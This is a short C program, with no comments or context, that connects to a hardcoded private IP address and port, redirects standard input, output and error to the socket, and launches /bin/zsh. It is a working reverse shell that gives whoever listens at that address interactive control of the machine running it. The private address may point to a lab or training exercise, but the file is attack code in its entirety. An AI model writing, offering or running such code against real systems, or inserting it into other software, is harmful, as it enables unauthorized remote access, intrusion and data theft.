#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
	int sock = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in saddr;
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(20128);
	inet_aton("192.168.221.136", &saddr.sin_addr);
	connect(sock, (struct sockaddr *) &saddr, sizeof(struct sockaddr_in));

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	char *tab[2];
	tab[0] = "/bin/zsh";
	tab[1] = NULL;
	execve("/bin/zsh", tab, NULL);

}
